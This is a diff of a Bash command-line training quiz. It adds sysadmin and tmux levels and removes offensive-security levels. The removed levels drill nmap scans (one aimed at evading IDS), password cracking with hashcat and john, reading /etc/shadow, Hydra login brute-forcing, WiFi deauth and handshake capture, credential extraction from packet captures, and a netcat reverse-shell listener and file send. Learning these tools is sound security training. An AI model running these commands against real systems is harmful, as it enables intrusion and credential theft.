@@ -74,6 +74,8 @@ _first_run() {
 EOF
   echo
   read -rp "    Enter your handle: " PLAYER_NAME
+  PLAYER_NAME="${PLAYER_NAME//$'\e'*/}"          # strip ANSI escapes
+  PLAYER_NAME="${PLAYER_NAME:0:20}"              # truncate to 20 chars
   [[ -z "$PLAYER_NAME" ]] && PLAYER_NAME="anon"
   BOSS_BEATEN=0; _PROFILE_VER=2
   _save_profile
@@ -1719,6 +1721,131 @@ gen_level13() {
 }
 
 # Level 16: Text Search (grep, rg)
+gen_level14() {
+  eval "local questions=() $_QV"; _ctx
+  _fphrase git vim tmux htop curl wget rsync jq; local pkg=$REPLY
+  _fphrase ls cat grep find sort awk sed head; local sysbin=$REPLY
+
+  # Network diagnostics
+  questions+=("Ping ${ip} 5 times|ping -c 5 ${ip}")
+  questions+=("Ping ${ip} continuously|ping ${ip}")
+  questions+=("Trace route to ${ip} (use ${Y}traceroute${C})|traceroute ${ip}|tracepath ${ip}")
+  questions+=("DNS lookup for ${host}|dig ${host}|nslookup ${host}|host ${host}")
+  questions+=("Reverse DNS lookup for ${ip}|dig -x ${ip}|host ${ip}")
+  questions+=("Check if port ${port} is open on ${ip}|nc -zv ${ip} ${port}")
+  questions+=("Show listening ports|ss -tlnp|netstat -tlnp")
+  questions+=("Show all network connections|ss -tunapl|netstat -tunapl")
+  questions+=("Show routing table|ip route|ip r")
+  questions+=("Show network interfaces|ip addr|ip a")
+
+  # System monitoring
+  questions+=("Show disk space usage|df -h")
+  questions+=("Show memory usage|free -h")
+  questions+=("Show system uptime|uptime")
+  questions+=("Show system info|uname -a")
+  questions+=("Show CPU info|lscpu|cat /proc/cpuinfo")
+  questions+=("Show kernel messages|dmesg|dmesg -T|journalctl -k")
+  questions+=("Interactive process viewer|top|htop|btop")
+  questions+=("Show top 10 memory-hungry processes§ps aux --sort=-%mem | head -11")
+  questions+=("Show process tree|pstree|ps auxf")
+
+  # Service management (systemd)
+  questions+=("Check status of ${svc}|systemctl status ${svc}")
+  questions+=("Start ${svc}|systemctl start ${svc}")
+  questions+=("Stop ${svc}|systemctl stop ${svc}")
+  questions+=("Restart ${svc}|systemctl restart ${svc}")
+  questions+=("Enable ${svc} at boot|systemctl enable ${svc}")
+  questions+=("Disable ${svc} at boot|systemctl disable ${svc}")
+  questions+=("List running services|systemctl list-units --type=service --state=running")
+  questions+=("Show services that failed to start|systemctl --failed")
+  questions+=("Reload systemd daemon|systemctl daemon-reload")
+  questions+=("Show ${svc} logs|journalctl -u ${svc}")
+  questions+=("Follow ${svc} logs|journalctl -fu ${svc}")
+  questions+=("Show logs since boot|journalctl -b")
+  questions+=("Show last 100 log lines|journalctl -n 100")
+
+  # User/permission management
+  questions+=("Run ${script} as root|sudo ${script}")
+  questions+=("Switch to root shell|sudo -i|su -|sudo su|sudo -s|sudo bash")
+  questions+=("Switch to user ${user}|su - ${user}")
+  questions+=("Add user ${user}|useradd -m ${user}|sudo useradd -m ${user}")
+  questions+=("Delete user ${user}|userdel -r ${user}|sudo userdel -r ${user}")
+  questions+=("Change password for ${user}|passwd ${user}|sudo passwd ${user}")
+  questions+=("Add ${user} to group wheel|usermod -aG wheel ${user}")
+  questions+=("List groups for ${user}|groups ${user}|id ${user}")
+  questions+=("Change owner of ${txt} to ${user}|chown ${user} ${txt}")
+  questions+=("Change owner and group of ${txt} to ${user}|chown ${user}:${user} ${txt}")
+  questions+=("Change owner of ${dir}/ recursively to ${user}|chown -R ${user}:${user} ${dir}/")
+  questions+=("Show current user|whoami")
+  questions+=("Show user id info|id")
+
+  # Package management (common patterns)
+  questions+=("Install package (Arch)|pacman -S ${pkg}|paru -S ${pkg}")
+  questions+=("Upgrade all packages (Arch)|pacman -Syu|paru -Syu")
+  questions+=("Search for package|pacman -Ss ${term}|paru -Ss ${term}")
+  questions+=("Show package info (Arch)|pacman -Qi ${pkg}|paru -Qi ${pkg}")
+  questions+=("List installed packages|pacman -Q|paru -Q")
+  questions+=("Which package owns a file (Arch)|pacman -Qo /usr/bin/${sysbin}|paru -Qo /usr/bin/${sysbin}")
+
+  # Security audit
+  questions+=("Run full system security audit|lynis audit system")
+  questions+=("Lynis scan specific category|lynis audit system --tests-from-group networking")
+
+  printf '%s\n' "${questions[@]}"
+}
+gen_level15() {
+  eval "local questions=() $_QV"; _ctx
+
+  # Session management (CLI)
+  questions+=("Start new tmux session|tmux|tmux new")
+  questions+=("Start tmux session named 'work'|tmux new -s work|tmux new-session -s work")
+  questions+=("List sessions|tmux ls|tmux list-sessions")
+  questions+=("Attach to last session|tmux attach|tmux a")
+  questions+=("Attach to session 'work'|tmux attach -t work|tmux a -t work")
+  questions+=("Kill session 'work'|tmux kill-session -t work")
+  questions+=("Kill tmux server (all sessions)|tmux kill-server")
+  questions+=("Rename session 'work' to 'dev'|tmux rename-session -t work dev")
+
+  # Window management (CLI)
+  questions+=("Create new window in session|tmux new-window|tmux neww")
+  questions+=("Create named window 'logs'|tmux new-window -n logs")
+  questions+=("Split pane left/right|tmux split-window -h")
+  questions+=("Split pane top/bottom|tmux split-window -v")
+  questions+=("List all windows|tmux list-windows")
+  questions+=("Select window 0|tmux select-window -t 0")
+  questions+=("Swap current window with window 0|tmux swap-window -t 0")
+
+  # Pane management (CLI)
+  questions+=("List all panes|tmux list-panes")
+  questions+=("Select pane to the right|tmux select-pane -R")
+  questions+=("Select pane below|tmux select-pane -D")
+  questions+=("Zoom/unzoom pane|tmux resize-pane -Z")
+  questions+=("Kill current pane|tmux kill-pane")
+  questions+=("Resize pane down by 10 lines|tmux resize-pane -D 10")
+  questions+=("Resize pane right by 20 columns|tmux resize-pane -R 20")
+  questions+=("Swap with next pane|tmux swap-pane -D")
+
+  # Scripting / automation (the real power)
+  questions+=("Send keys to session 'work'|tmux send-keys -t work 'ls -la' Enter")
+  questions+=("Capture pane output to stdout|tmux capture-pane -p")
+  questions+=("Save pane output to file§tmux capture-pane -p > output.txt")
+  questions+=("Run command in new window§tmux new-window 'htop'")
+  questions+=("Create session with command§tmux new -s monitor 'htop'")
+  questions+=("Pipe pane output to log file|tmux pipe-pane -t work 'cat >> session.log'")
+
+  # Essential keybindings (recall, not drills)
+  questions+=("Keybinding: detach from session|Ctrl+b d")
+  questions+=("Keybinding: split pane left/right|Ctrl+b %")
+  questions+=("Keybinding: split pane top/bottom|Ctrl+b \"")
+  questions+=("Keybinding: cycle to next pane|Ctrl+b o")
+  questions+=("Keybinding: toggle pane zoom|Ctrl+b z")
+  questions+=("Keybinding: enter copy mode|Ctrl+b [")
+  questions+=("Keybinding: show all keybindings|Ctrl+b ?")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 29: Privilege Escalation
 gen_level16() {
   eval "local questions=() $_QV"; _ctx
   _frnum 1 10; local ctx=$REPLY; _frnum 2 5; local ctx2=$REPLY
@@ -1909,378 +2036,6 @@ gen_level18() {
 }
 
 # Level 21: Batch Operations
-gen_level21() {
-  eval "local questions=() $_QV"; _ctx
-  _fpick SERVICES; local svc2=$REPLY; _frnum 2 8; local parallel=$REPLY; _frnum 1 20; local linenum=$REPLY
-
-  # find -exec - with flag alternatives
-  questions+=("Run ls -l on each .${ext} file found|find . -name '*.${ext}' -exec ls -l {} \\;|fd -e ${ext} -x ls -l {}")
-  questions+=("Count lines in each .${ext} file|find . -name '*.${ext}' -exec wc -l {} \\;|fd -e ${ext} -x wc -l {}")
-  questions+=("Delete all .${ext2} files|find . -name '*.${ext2}' -delete|fd -e ${ext2} -x rm {}")
-  questions+=("Make all .sh files executable|find . -name '*.sh' -exec chmod +x {} \\;|fd -e sh -x chmod +x {}")
-  questions+=("Search '${term}' in each .${ext} file|find . -name '*.${ext}' -exec grep ${term} {} \\;|fd -e ${ext} -x rg ${term} {}")
-  questions+=("Show size of files larger than ${size}|find . -size +${size} -exec du -h {} \\;|fd -S +${size} -x du -h {}")
-  questions+=("Copy all .${ext} files to ${dir}/|find . -name '*.${ext}' -exec cp {} ${dir}/ \\;|fd -e ${ext} -x cp {} ${dir}/")
-  questions+=("Move all .${ext2} files to ${dir}/|find . -name '*.${ext2}' -exec mv {} ${dir}/ \\;|fd -e ${ext2} -x mv {} ${dir}/")
-  questions+=("Change owner of all files in ${dir}/ to ${user}|find ${dir}/ -exec chown ${user}:${user} {} \\;")
-  questions+=("Gzip all .${ext} files|find . -name '*.${ext}' -exec gzip {} \\;|fd -e ${ext} -x gzip {}")
-
-  # Batch with + (more efficient)
-  questions+=("List all .${ext} files in one ls call|find . -name '*.${ext}' -exec ls -l {} +")
-  questions+=("Count total lines across all .${ext} files§find . -name '*.${ext}' -exec wc -l {} + | tail -1")
-  questions+=("Cat all .${ext} files together|find . -name '*.${ext}' -exec cat {} +")
-
-  # sed replacement
-  questions+=("Replace '${old}' with '${new}' in ${cfg}|sed -i 's/${old}/${new}/g' ${cfg}|sd '${old}' '${new}' ${cfg}")
-  questions+=("Delete lines containing '${term}' in ${log}|sed -i '/${term}/d' ${log}")
-  questions+=("Delete empty lines from ${txt}|sed -i '/^$/d' ${txt}")
-  questions+=("Delete lines ${linenum} to $((linenum + n)) from ${txt}|sed -i '${linenum},$((linenum + n))d' ${txt}")
-  questions+=("Add prefix 'LOG: ' to each line in ${W}${log}${C}|sed -i 's/^/LOG: /' ${log}")
-  questions+=("Add suffix '.bak' to each line in ${W}${txt}${C}|sed -i 's/\$/.bak/' ${txt}")
-  questions+=("Replace '${old}' in all .${ext} files|find . -name '*.${ext}' -exec sed -i 's/${old}/${new}/g' {} \\;|fd -e ${ext} -x sd '${old}' '${new}' {}")
-  questions+=("Print only lines matching '${term}' in ${W}${log}${C}|sed -n '/${term}/p' ${log}")
-
-  # xargs - building commands from stdin
-  questions+=("Delete files listed in filelist.txt|xargs rm < filelist.txt")
-  questions+=("Grep in found files (safe with spaces)§find . -name '*.${ext}' -print0 | xargs -0 grep ${term}")
-  questions+=("Count lines in found files (safe with spaces)§find . -name '*.${ext}' -print0 | xargs -0 wc -l")
-  questions+=("Grep in parallel (${parallel} jobs)§find . -name '*.${ext}' -print0 | xargs -0 -P ${parallel} grep ${term}")
-  questions+=("Confirm before each delete (interactive)§find . -name '*.${ext2}' -print0 | xargs -0 -p rm")
-  questions+=("Copy files in batches of ${n}§find . -name '*.${ext}' -print0 | xargs -0 -n ${n} cp -t ${dir}/")
-  questions+=("Rename files with backup_ prefix§find . -maxdepth 1 -name '*.${ext}' -printf '%f\\n' | xargs -I {} mv {} backup_{}")
-  questions+=("Preview what xargs would run (verbose/trace mode)§find . -name '*.${ext}' -print0 | xargs -0 -t wc -l")
-
-  # Combined operations
-  questions+=("Find .${ext} files > ${size}, show sizes sorted§find . -name '*.${ext}' -size +${size} -exec du -h {} \\; | sort -rh")
-  questions+=("Replace and backup: ${old} -> ${new}, keep .bak in ${W}${cfg}${C}|sed -i.bak 's/${old}/${new}/g' ${cfg}")
-  questions+=("Find and replace recursively in ${dir}/|find ${dir}/ -type f -exec sed -i 's/${old}/${new}/g' {} \\;")
-
-  # Systemd service management - L19-only commands (basics covered in L12)
-  questions+=("Reload ${svc} config without restart|systemctl reload ${svc}|sudo systemctl reload ${svc}")
-  questions+=("Check if ${svc} is enabled|systemctl is-enabled ${svc}")
-  questions+=("Check if ${svc} is active|systemctl is-active ${svc}")
-  questions+=("Show ${svc} unit file|systemctl cat ${svc}")
-  questions+=("Edit ${svc} unit file override|systemctl edit ${svc}|sudo systemctl edit ${svc}")
-  questions+=("Mask ${svc} (prevent starting)|systemctl mask ${svc}|sudo systemctl mask ${svc}")
-  questions+=("Unmask ${svc}|systemctl unmask ${svc}|sudo systemctl unmask ${svc}")
-
-  # Journalctl - L19-only commands (basics covered in L12)
-  questions+=("View last ${n2} log lines for ${svc}|journalctl -u ${svc} -n ${n2}")
-  questions+=("View kernel messages|journalctl -k|dmesg")
-  questions+=("View logs from last hour|journalctl --since '1 hour ago'")
-  questions+=("View logs from last ${n} minutes|journalctl --since '${n} minutes ago'")
-  questions+=("View errors only|journalctl -p err|journalctl -p 3")
-  questions+=("Disk usage of journal|journalctl --disk-usage")
-  local jsize=${size/k/K}
-  questions+=("Vacuum journal to ${jsize}|journalctl --vacuum-size=${jsize}|sudo journalctl --vacuum-size=${jsize}")
-  questions+=("Output as JSON|journalctl -u ${svc} -o json")
-
-  # Cron / crontab - scheduling
-  questions+=("Edit your crontab|crontab -e")
-  questions+=("List your cron jobs|crontab -l")
-  questions+=("Remove all your cron jobs|crontab -r")
-  questions+=("Edit root's crontab|sudo crontab -e")
-  local cron_path="/usr/local/bin/${script}"
-  questions+=("Run ${script} every 5 minutes|*/5 * * * * ${cron_path}")
-  questions+=("Run ${script} at midnight daily|0 0 * * * ${cron_path}")
-  questions+=("Run ${script} every Monday at 3am|0 3 * * 1 ${cron_path}")
-  questions+=("Run ${script} on the 1st of each month|0 0 1 * * ${cron_path}")
-  questions+=("Run ${script} every hour|0 * * * * ${cron_path}|@hourly ${cron_path}")
-  questions+=("Run ${script} at reboot|@reboot ${cron_path}")
-  questions+=("Cron: redirect output to log§*/5 * * * * ${cron_path} >> /var/log/${script%.sh}.log 2>&1")
-  questions+=("Cron: silence all output§0 * * * * ${cron_path} > /dev/null 2>&1")
-
-  # === COMPOUND: Uses grep (L14), pipes (L3), logic (L6), find (L15) ===
-  questions+=("Replace '${old}' in all .${ext} files, confirm changes§find . -name '*.${ext}' -exec grep -l ${old} {} \\; | xargs sed -i 's/${old}/${new}/g'")
-  questions+=("Find .${ext} files > ${size}, print and delete§find . -name '*.${ext}' -size +${size} -print -delete")
-  questions+=("Check ${svc} status, restart if not active§systemctl is-active ${svc} || systemctl restart ${svc}")
-  questions+=("View ${svc} errors, count unique messages§journalctl -u ${svc} -p err --no-pager | sort | uniq -c | sort -rn")
-  questions+=("Find and grep all logs modified today§find /var/log -mtime 0 -type f -exec grep -l ${term} {} \\;")
-
-  printf '%s\n' "${questions[@]}"
-}
-
-# Level 25: Network Scanning (nmap)
-gen_level25() {
-  eval "local questions=() $_QV"; _ctx
-  port2=$((port + 1000))
-
-  # Basic scans
-  questions+=("Scan all 65535 ports on ${ip}|nmap -p- ${ip}")
-  questions+=("Scan top 100 most common ports on ${ip}|nmap --top-ports 100 ${ip}")
-  questions+=("Scan specific ports ${port},${port2} on ${ip}|nmap -p ${port},${port2} ${ip}")
-  questions+=("Scan port range 1-1000 on ${ip}|nmap -p 1-1000 ${ip}")
-  questions+=("Fast scan (top 100 ports) on ${ip}|nmap -F ${ip}")
-
-  # Service/version detection
-  questions+=("Detect service versions (banner grab) on ${ip}|nmap -sV ${ip}")
-  questions+=("OS fingerprinting via TCP/IP stack on ${ip}|nmap -O ${ip}")
-  questions+=("Aggressive scan (-A = OS, version, scripts, traceroute)|nmap -A ${ip}")
-  questions+=("Run default NSE scripts (-sC) on ${ip}|nmap -sC ${ip}")
-  questions+=("Combined recon: version + scripts on ${ip}|nmap -sV -sC ${ip}")
-
-  # Scan types
-  questions+=("UDP scan top 20 ports on ${ip}|nmap -sU --top-ports 20 ${ip}")
-  questions+=("TCP connect scan on ${ip} (full handshake)|nmap -sT ${ip}")
-  questions+=("TCP SYN scan on ${ip} (half-open)|nmap -sS ${ip}")
-  questions+=("Scan ${ip}, skip host discovery (treat as up)|nmap -Pn ${ip}")
-
-  # Network discovery
-  questions+=("Ping sweep ${subnet} (find live hosts)|nmap -sn ${subnet}")
-  questions+=("List targets in ${subnet} without scanning|nmap -sL ${subnet}")
-  questions+=("ARP scan local network ${subnet}|nmap -PR -sn ${subnet}")
-
-  # Output formats
-  questions+=("Scan ${ip}, save all formats to 'scan' prefix|nmap -oA scan ${ip}")
-  questions+=("Scan ${ip}, save greppable output to scan.gnmap|nmap -oG scan.gnmap ${ip}")
-
-  # Scripts
-  questions+=("Run vulnerability scripts on ${ip}|nmap --script vuln ${ip}")
-  questions+=("Banner grab port ${port} on ${ip}|nmap -sV -p ${port} --script banner ${ip}")
-  questions+=("Enumerate SMB shares on ${ip}|nmap --script smb-enum-shares ${ip}")
-  questions+=("Enumerate HTTP methods on ${ip}|nmap --script http-methods -p 80,443 ${ip}")
-  questions+=("Check for anonymous FTP on ${ip}|nmap --script ftp-anon -p 21 ${ip}")
-
-  # Speed and stealth
-  questions+=("Slow scan ${ip} (evade IDS)|nmap -T1 ${ip}")
-  questions+=("Aggressive timing scan ${ip} (faster)|nmap -T4 ${ip}")
-
-  # Combined
-  questions+=("Full scan: all ports, version, scripts, all outputs|nmap -p- -sV -sC -oA full ${ip}")
-
-  printf '%s\n' "${questions[@]}"
-}
-
-# Level 27: Hash Cracking
-gen_level27() {
-  eval "local questions=() $_QV"; _ctx
-  local hidx=$((RANDOM % ${#HASHCAT_MODES[@]}))
-  local hmode=${HASHCAT_MODES[$hidx]} hname=${HASH_NAMES[$hidx]}
-
-  # Hashcat dictionary attacks
-  questions+=("Dictionary attack on MD5 (-m 0) hashes in ${hash} using ${W}${wordlist}${C}|hashcat -m 0 ${hash} ${wordlist}")
-  questions+=("Dictionary attack on ${hname} (-m ${hmode}) hashes using ${W}${wordlist}${C}|hashcat -m ${hmode} ${hash} ${wordlist}")
-  questions+=("Crack Windows NTLM hashes (-m 1000) in ${hash} using ${W}${wordlist}${C}|hashcat -m 1000 ${hash} ${wordlist}")
-
-  # Hashcat brute force
-  questions+=("Brute force 4-digit PIN (MD5)|hashcat -m 0 -a 3 ${hash} ?d?d?d?d")
-  questions+=("Mask attack: Capital + 5 lower + 2 digits|hashcat -m 0 -a 3 ${hash} ?u?l?l?l?l?l?d?d")
-
-  # Hashcat rules & session
-  questions+=("Crack ${hash} with rules using ${W}${wordlist}${C}|hashcat -m 0 -r rules/best64.rule ${hash} ${wordlist}")
-  questions+=("Show already cracked from ${hash}|hashcat -m 0 ${hash} --show")
-  questions+=("Resume interrupted hashcat session|hashcat --restore")
-
-  # John the Ripper
-  questions+=("Crack ${hash} with john (auto-detect format)|john ${hash}")
-  questions+=("Crack ${hash} with john using ${wordlist}|john --wordlist=${wordlist} ${hash}")
-  questions+=("Show cracked passwords from john|john --show ${hash}")
-  questions+=("List supported john formats|john --list=formats")
-
-  # John hash extraction (FIXED - was incorrect before)
-  questions+=("Extract hash from encrypted ZIP file|zip2john archive.zip > hash.txt")
-  questions+=("Extract hash from encrypted PDF|pdf2john document.pdf > hash.txt")
-  questions+=("Extract hash from encrypted RAR|rar2john archive.rar > hash.txt")
-  questions+=("Extract hash from /etc/shadow format|unshadow /etc/passwd /etc/shadow > hash.txt")
-
-  # Hydra
-  questions+=("Brute force SSH login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ssh")
-  questions+=("Brute force FTP login for ${user} on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} ftp")
-  questions+=("Brute force HTTP basic auth on ${ip} using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} http-get /")
-  questions+=("Brute force HTTP POST login form using ${W}${wordlist}${C}|hydra -l ${user} -P ${wordlist} ${ip} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'")
-  questions+=("Brute force with ${W}${wordlist}${C} and username list|hydra -L users.txt -P ${wordlist} ${ip} ssh")
-  questions+=("Brute force with ${W}${wordlist}${C}, limit to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh")
-
-  # Encoding/decoding
-  questions+=("Encode string 'secret' to base64§echo -n 'secret' | base64")
-  questions+=("Decode base64 file encoded.txt|base64 -d encoded.txt")
-  questions+=("Generate MD5 hash of string 'password'§echo -n 'password' | md5sum")
-  questions+=("Generate SHA256 hash of string 'password'§echo -n 'password' | sha256sum")
-  questions+=("Generate SHA256 hash of file ${hash}|sha256sum ${hash}")
-
-  # Hex operations
-  questions+=("Convert 'hello' to hex§echo -n 'hello' | xxd -p")
-  questions+=("Convert hex back to ascii§echo '68656c6c6f' | xxd -r -p")
-  questions+=("Hex dump ${W}${bin}${C} with addresses|xxd ${bin}")
-  questions+=("Hex dump ${W}${bin}${C} (no addresses)|xxd -p ${bin}")
-
-  printf '%s\n' "${questions[@]}"
-}
-
-# Level 28: Forensics
-gen_level28() {
-  eval "local questions=() $_QV"; _ctx
-
-  # String extraction
-  questions+=("Extract ASCII strings from ${bin}|strings ${bin}")
-  questions+=("Extract strings minimum 10 chars in ${W}${bin}${C}|strings -n 10 ${bin}")
-  questions+=("Extract Unicode strings (Windows binaries) in ${W}${bin}${C}|strings -e l ${bin}")
-  questions+=("Find URLs in ${W}${bin}${C}§strings ${bin} | grep -E 'https?://'")
-  questions+=("Find email addresses in ${W}${bin}${C}§strings ${bin} | grep -E '[A-Za-z0-9._%+-]+@'")
-
-  # ELF analysis
-  questions+=("Show ELF file header in ${W}${bin}${C}|readelf -h ${bin}")
-  questions+=("Show ELF symbols in ${W}${bin}${C}|readelf -s ${bin}")
-  questions+=("Show all ELF info in ${W}${bin}${C}|readelf -a ${bin}")
-  questions+=("List shared library dependencies of ${W}${bin}${C}|ldd ${bin}")
-
-  # Radare2
-  questions+=("Analyze ${bin} with radare2|r2 -A ${bin}")
-  questions+=("Disassemble main function of ${W}${bin}${C}|r2 -qc 'aaa; pdf @main' ${bin}")
-  questions+=("List functions in ${W}${bin}${C}|r2 -qc 'aaa; afl' ${bin}")
-
-  # Binwalk
-  questions+=("Scan ${bin} for embedded files|binwalk ${bin}")
-  questions+=("Extract embedded files from ${bin}|binwalk -e ${bin}")
-  questions+=("Analyze entropy of ${bin}|binwalk -E ${bin}")
-
-  # Memory forensics (volatility3) - most common
-  local -a _MEM_IMGS=(memory.dmp vmcore.dmp pagefile.sys)
-  _fpick _MEM_IMGS; local memimg=$REPLY
-  questions+=("List processes from memory dump|vol -f ${memimg} windows.pslist")
-  questions+=("List network connections from memory|vol -f ${memimg} windows.netscan")
-  questions+=("Show command lines of processes|vol -f ${memimg} windows.cmdline")
-  questions+=("Scan for files in memory dump|vol -f ${memimg} windows.filescan")
-
-  # File metadata
-  questions+=("Extract all metadata from ${photo}|exiftool ${photo}")
-  questions+=("Extract GPS coordinates from ${W}${photo}${C}|exiftool '-GPS*' ${photo}")
-  questions+=("Remove all metadata from ${photo}|exiftool -all= ${photo}")
-
-  # Disk imaging
-  questions+=("Create disk image of /dev/sda to ${W}${img}${C}|dd if=/dev/sda of=${img} bs=4M status=progress")
-  questions+=("Mount ${W}${img}${C} read-only|mount -o ro,loop ${img} /mnt/evidence")
-  questions+=("Verify checksums file|sha256sum -c ${hash}")
-
-  # File recovery / carving
-  questions+=("Recover deleted files from ${img}|foremost -i ${img}")
-  questions+=("Recover specific file types from ${W}${img}${C}|foremost -t jpg,pdf -i ${img}")
-  questions+=("Foremost with custom output dir on ${W}${img}${C}|foremost -i ${img} -o ${dir}/")
-  questions+=("List files in ${W}${img}${C} (TSK)|fls ${img}")
-  questions+=("List files recursively in ${W}${img}${C}|fls -r ${img}")
-  questions+=("List deleted files in ${W}${img}${C}|fls -d ${img}")
-  questions+=("Create filesystem timeline|mactime -b ${dir}/bodyfile")
-  questions+=("Create bodyfile from ${W}${img}${C}|fls -r -m / ${img} > ${dir}/bodyfile")
-
-  printf '%s\n' "${questions[@]}"
-}
-
-# Level 24: Network Tools
-gen_level24() {
-  eval "local questions=() $_QV"; _ctx
-  local key=data  # export.json only has .data array
-
-  # tshark - packet capture & analysis
-  questions+=("Capture traffic on ${iface} to ${pcap}|tshark -i ${iface} -w ${pcap}")
-  questions+=("Capture only 100 packets to ${W}${pcap}${C}|tshark -i ${iface} -c 100 -w ${pcap}")
-  questions+=("Read and display ${pcap}|tshark -r ${pcap}")
-  questions+=("Filter HTTP traffic from ${pcap}|tshark -r ${pcap} -Y http")
-  questions+=("Filter traffic to/from ${ip} in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'ip.addr == ${ip}'")
-  questions+=("Show DNS queries in ${W}${pcap}${C}|tshark -r ${pcap} -Y dns|tshark -r ${pcap} -Y 'dns.qry.name'")
-  questions+=("Extract HTTP POST data in ${W}${pcap}${C}|tshark -r ${pcap} -Y 'http.request.method == POST' -T fields -e http.file_data")
-  questions+=("Extract all URLs from ${W}${pcap}${C}|tshark -r ${pcap} -Y 'http.request' -T fields -e http.host -e http.request.uri")
-  questions+=("Show TCP conversations in ${W}${pcap}${C}|tshark -r ${pcap} -q -z conv,tcp")
-  questions+=("Extract credentials (FTP, HTTP basic) in ${W}${pcap}${C}§tshark -r ${pcap} -Y 'ftp.request.command == PASS || http.authbasic'")
-
-  # jq - JSON processing
-  questions+=("Pretty print JSON file|jq '.' data/export.json")
-  questions+=("Extract '${key}' array from JSON|jq '.${key}' data/export.json")
-  questions+=("Extract first item from '${key}' array|jq '.${key}[0]' data/export.json")
-  questions+=("Extract 'name' field from each item§jq '.${key}[] | .name' data/export.json")
-  questions+=("Filter items where status is 'active'§jq '.${key}[] | select(.status == \"active\")' data/export.json")
-  questions+=("Count items in array§jq '.${key} | length' data/export.json")
-  questions+=("Get keys of JSON object|jq 'keys' data/export.json")
-  questions+=("Compact JSON (remove whitespace)|jq -c '.' data/export.json")
-  questions+=("Create new object from fields§jq '.${key}[] | {name: .name, id: .id}' data/export.json")
-  questions+=("Fetch ${url}/api and extract '${key}' array with ${Y}jq${C}§curl -s ${url}/api | jq '.${key}'")
-
-  # curl - HTTP client
-  questions+=("GET request to ${url}|curl ${url}")
-  questions+=("GET request with headers shown|curl -i ${url}")
-  questions+=("POST JSON data|curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' ${url}/api")
-  questions+=("POST form data|curl -X POST -d 'user=admin&pass=test' ${url}/login")
-  questions+=("Follow redirects|curl -L ${url}")
-  questions+=("Save output to file|curl -o output.html ${url}")
-  questions+=("Send with custom header|curl -H 'Authorization: Bearer token123' ${url}/api")
-  questions+=("Silent mode (no progress)|curl -s ${url}")
-  questions+=("Download file with original name|curl -O ${url}/file.tar.gz")
-
-  # SSH tunneling (CRITICAL for pentesting)
-  questions+=("SSH local port forward: access remote ${port} via local 8080|ssh -L 8080:localhost:${port} ${user}@${host}")
-  questions+=("SSH remote port forward: expose local ${port} on remote|ssh -R ${port}:localhost:${port} ${user}@${host}")
-  questions+=("SSH dynamic SOCKS proxy on port 1080|ssh -D 1080 ${user}@${host}")
-  questions+=("SSH through jump host to target|ssh -J ${user}@jump ${user}@target")
-  questions+=("SSH tunnel in background|ssh -fN -L 8080:localhost:80 ${user}@${host}")
-  questions+=("SSH execute remote command|ssh ${user}@${host} 'ls -la'")
-  questions+=("SCP file to remote|scp file.txt ${user}@${host}:/tmp/")
-  questions+=("Rsync with progress|rsync -avz --progress file.txt ${user}@${host}:/backup/")
-
-  # wget
-  questions+=("Download file|wget ${url}/file.tar.gz")
-  questions+=("Continue interrupted download|wget -c ${url}/large.iso")
-  questions+=("Mirror website for offline|wget -mk ${url}")
-
-  # OpenSSL (cert checking, encryption)
-  questions+=("Check SSL cert of website|openssl s_client -connect ${host}:443")
-  questions+=("Generate random 32-byte hex string|openssl rand -hex 32")
-  questions+=("Encrypt file with AES-256|openssl enc -aes-256-cbc -pbkdf2 -salt -in file.txt -out file.enc")
-  questions+=("Decrypt AES-256 file|openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.txt")
-  questions+=("Generate RSA key pair|openssl genrsa -out key.pem 4096")
-
-  # SMB/NetBIOS
-  questions+=("List SMB shares anonymously on ${ip}|smbclient -L //${ip} -N")
-  questions+=("Connect to SMB share|smbclient //${ip}/share -U ${user}")
-  questions+=("Enumerate SMB with enum4linux|enum4linux -a ${ip}")
-
-  printf '%s\n' "${questions[@]}"
-}
-
-# Level 26: WiFi & RF
-gen_level26() {
-  eval "local questions=() $_QV"; _ctx
-  _fpick WIFI_INTERFACES; local wiface=$REPLY
-
-  # WiFi attacks
-  questions+=("Enable monitor mode on ${wiface}|airmon-ng start ${wiface}")
-  questions+=("Scan for WiFi networks|airodump-ng ${wiface}mon")
-  questions+=("Capture handshake from specific AP|airodump-ng -c 6 --bssid ${mac} -w capture ${wiface}mon")
-  questions+=("Send deauth packets to force handshake|aireplay-ng -0 5 -a ${mac} ${wiface}mon")
-  questions+=("Crack WPA handshake using ${W}${wordlist}${C}|aircrack-ng -w ${wordlist} capture-01.cap")
-
-  # Netcat
-  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
-  questions+=("Connect to remote port|nc ${ip} ${port}")
-  questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
-  questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")
-
-  # Mass scanning
-  questions+=("Mass scan all ports on subnet at 10k rate|masscan -p1-65535 ${ip%.*}.0/24 --rate 10000")
-  questions+=("Masscan specific ports|masscan -p 22,80,443 ${ip%.*}.0/24 --rate 1000")
-
-  # Packet capture
-  questions+=("Capture packets on ${iface}|tcpdump -i ${iface}")
-  questions+=("Capture and save to ${W}${pcap}${C}|tcpdump -i ${iface} -w ${pcap}")
-  questions+=("Read saved ${W}${pcap}${C}|tcpdump -r ${pcap}")
-  questions+=("Capture only port ${port} traffic|tcpdump -i ${iface} port ${port}")
-  questions+=("Capture only traffic to/from ${ip}|tcpdump -i ${iface} host ${ip}")
-  questions+=("Capture first ${n} packets|tcpdump -i ${iface} -c ${n}")
-  questions+=("Capture with verbose output|tcpdump -i ${iface} -vvv")
-  questions+=("Capture DNS traffic only|tcpdump -i ${iface} port 53")
-  questions+=("Capture HTTP traffic only|tcpdump -i ${iface} port 80")
-  questions+=("Don't resolve hostnames in capture|tcpdump -i ${iface} -n")
-
-
-  # Wireless recon
-  questions+=("Show wireless interfaces|iw dev")
-  questions+=("Scan for nearby APs|iw dev ${wiface} scan|iwlist ${wiface} scan")
